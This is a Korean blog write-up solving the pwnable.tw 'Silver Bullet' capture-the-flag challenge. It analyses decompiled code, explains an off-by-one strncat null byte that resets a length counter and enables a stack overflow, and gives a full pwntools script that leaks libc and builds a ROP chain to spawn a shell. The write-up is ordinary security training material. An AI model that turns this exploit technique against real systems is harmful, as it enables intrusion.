---
layout: post
title: "pwnable.tw - Silver Bullet"
date: 2018-11-08
excerpt: "1 byte overflow + simple ROP"
tags: [write-up]
comments: true
---
```
1. Create a Silver Bullet 
2. Power up Silver Bullet 
3. Beat the Werewolf      
4. Return
```
main은 단순히 옵션 선택이며 히든 옵션은 없습니다.

```c
char s; // [esp+8h] [ebp-34h]
int v8; // [esp+38h] [ebp-4h]
.
.
memset(&s, 0, 0x30u);
.
.

```
그리고 위와 같이 48 바이트 크기의 char형 배열과 int형 변수 하나가 선언되어 있습니다. 이를 bullet과 power로 부르겠습니다.

bullet은 모두 0으로 초기화 됩니다.

#### 1. Create a Silver Bullet
```c
int __cdecl create_bullet(char *s)
{
  size_t v2; // ST08_4

  if ( *s )
    return puts("You have been created the Bullet !");
  printf("Give me your description of bullet :");
  read_input(s, 48u);
  v2 = strlen(s);
  printf("Your power is : %u\n", v2);
  *(s + 12) = v2;
  return puts("Good luck !!");
}
```
bullet에 값이 있는지 체크한 뒤, 없다면 48 만큼 입력받습니다.

특이한 점은, 입력한 길이가 power에 저장됩니다.

#### 2. Power up Silver Bullet
```c
int __cdecl power_up(char *dest)
{
  char s; // [esp+0h] [ebp-34h]
  size_t v3; // [esp+30h] [ebp-4h]

  v3 = 0;
  memset(&s, 0, 0x30u);
  if ( !*dest )
    return puts("You need create the bullet first !");
  if ( *(dest + 12) > 47u )
    return puts("You can't power up any more !");
  printf("Give me your another description of bullet :");
  read_input(&s, 48 - *(dest + 12));
  strncat(dest, &s, 48 - *(dest + 12));
  v3 = strlen(&s) + *(dest + 12);
  printf("Your new power is : %u\n", v3);
  *(dest + 12) = v3;
  return puts("Enjoy it !");
}
```
power가 47 이하라면 (48 - power)만큼 입력받아 입력값을 strncat으로 bullet 뒤에 이어 붙입니다.

그 후 bullet + 12(power)와 새로운 입력값의 길이를 더해 power에 다시 저장합니다.

#### 3. Beat the Werewolf      
```c
signed int __cdecl beat(int a1, _DWORD *a2)
{
  signed int result; // eax

  if ( *a1 )
  {
    puts(">----------- Werewolf -----------<");
    printf(" + NAME : %s\n", a2[1]);
    printf(" + HP : %d\n", *a2);
    puts(">--------------------------------<");
    puts("Try to beat it .....");
    usleep(1000000u);
    *a2 -= *(a1 + 48);
    if ( *a2 <= 0 )
    {
      puts("Oh ! You win !!");
      result = 1;
    }
    else
    {
      puts("Sorry ... It still alive !!");
      result = 0;
    }
  }
  else
  {
    puts("You need create the bullet first !");
    result = 0;
  }
  return result;
}
```
bullet에 값이 있다면, a2(main에서 선언된 int형 변수이며, 0x7fffff의 값을 가집니다.)에서 power을 빼,

그 값이 0 이하라면 return 1 하고, 그 외에는 0을 리턴합니다.

```c
if ( beat(&s, &v5) )
      return 0;
```
위는 main의 코드의 일부인데, beat()의 리턴값이 1이라면 main은 return 0 합니다.

이는 특정 조건 달성시 ROP를 트리거해주는 장치라고 추측할 수 있습니다.

### Exploit

취약점은 strncat과 power up()에서 power을 처리할 때 발생합니다.

Create bullet시 47 바이트를 입력하면 Power up시 1 바이트를 입력하는데, strncat으로 47 바이트 뒤에 1 바이트를 strncat하면

뒤에 NULL이 따라 붙기 때문에 47 + 1 바이트가 버퍼를 채우고 NULL이 power을 덮게 됩니다.

strncat후 power이 0x00으로 덮인 상태에서
```
strncat(dest, &s, 48 - *(dest + 12));
v3 = strlen(&s) + *(dest + 12);
printf("Your new power is : %u\n", v3);
*(dest + 12) = v3;
```
위와 같이 원래 power을 따로 보관하지 않는다는 소스의 허점때문에 결국 power는 새로 입력한 데이터의 길이인 0x01이 됩니다.

그렇게 되면 다음번 power up시 48 - 1 = 47 바이트를 버퍼 뒤에 이어 입력할 수 있게 되기에 power와 main의 eip를 조작할 수 있습니다.

따라서 puts로 libc를 leak하고 main loop으로 다시 ROP를 진행하면 쉘 취득이 가능합니다.

exp.py
```python
from pwn import *

def create(payload):
	p.recvuntil('Your choice :')
	p.sendline('1')
	p.recvuntil('description of bullet :')
	p.send(payload)

def up(payload):
	p.recvuntil('Your choice :')
	p.sendline('2')
	p.recvuntil('another description of bullet :')
	p.send(payload)

def beat():
	p.recvuntil('Your choice :')
	p.sendline('3')
	p.recvuntil('!!\n')

#p = process('./silver_bullet')
p = remote('chall.pwnable.tw', 10103)
e = ELF('./silver_bullet')
l = ELF('libc_32.so.6')

puts_plt = e.plt['puts']
puts_got = e.got['puts']

main = 0x08048954

offset_puts = l.symbols['puts']
#offset_puts = 0x5fca0 # local
offset_system = l.symbols['system']
#offset_system = 0x3ada0 # local
offset_binsh = next(l.search('/bin/sh'))
#offset_binsh = 0x15ba0b # local

# Stage 1 : libc leak

create('A' * 47)
up('A')

payload = '\xff'* 7
payload += p32(puts_plt) + p32(main) + p32(puts_got)

up(payload)
beat()

libc = u32(p.recv(4)) - offset_puts
system = libc + offset_system
binsh = libc + offset_binsh

log.info('libc base : ' + str(hex(libc)))

# Stage 2 : ROP

create('A' * 47)
up('A')

payload = '\xff' * 7
payload += p32(system) + 'AAAA' + p32(binsh)

up(payload)
beat()

p.interactive()
```

![shell](https://t1.daumcdn.net/cfile/tistory/997AA93C5BE4228002)



